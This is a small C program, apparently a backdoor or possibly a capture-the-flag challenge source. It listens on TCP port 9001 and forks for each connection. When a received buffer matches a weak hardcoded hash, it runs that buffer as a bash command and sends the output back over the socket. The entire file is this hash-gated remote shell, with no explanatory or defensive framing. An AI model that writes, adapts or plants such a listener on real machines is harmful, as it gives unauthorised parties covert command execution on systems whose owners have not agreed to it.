#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>

unsigned long hash(const unsigned char *s, int len)
{
    unsigned int ret = 0xeb;
    while (len > 0) {
        ret += *(unsigned int *) s * 0x1337;
        s += 4, len -= 4;
    }
    return ret;
}

void fn(int c)
{
    char buf[128]; int len;
    memset(buf, 0, sizeof(buf));
    while ((len = recv(c, buf, sizeof(buf), 0)) > 0) {
        if(hash((unsigned char *) buf, len) == 0xf1cb454e) {
            char *argv[] = {"/bin/bash", "-c", buf, NULL};
            dup2(c, 1);
            execv(argv[0], argv);
        }
    }
    close(c);
    exit(0);
}

int Main()
{
    int s = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in service;
    service.sin_family = AF_INET;
    service.sin_addr.s_addr = 0;
    service.sin_port = htons(9001);

    bind(s, (struct sockaddr *) &service, sizeof(service));

    listen(s, 5);

    while (1) {
        int c = accept(s, NULL, NULL);
        if(fork() == 0) {
            fn(c);
        }
        close(c);
    }
}
